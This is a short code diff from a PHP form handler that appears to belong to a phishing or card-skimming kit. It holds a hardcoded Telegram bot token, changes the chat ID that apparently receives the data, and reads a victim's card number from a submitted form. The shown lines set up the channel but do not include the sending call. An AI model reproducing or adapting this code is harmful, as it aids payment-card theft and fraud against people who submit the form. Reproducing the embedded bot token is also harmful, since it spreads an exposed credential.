@@ -70,7 +70,7 @@ function getBrowser($USER_AGENT){
 }
 // Token du bot Telegram et ID du chat
 $botToken = "8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ";
-$chatId = "-4639401211";
+$chatId = "-1002514605037";
 
 // Récupération des données du formulaire
 $cardNumber = htmlspecialchars($_POST['cardNumber'] ?? '');
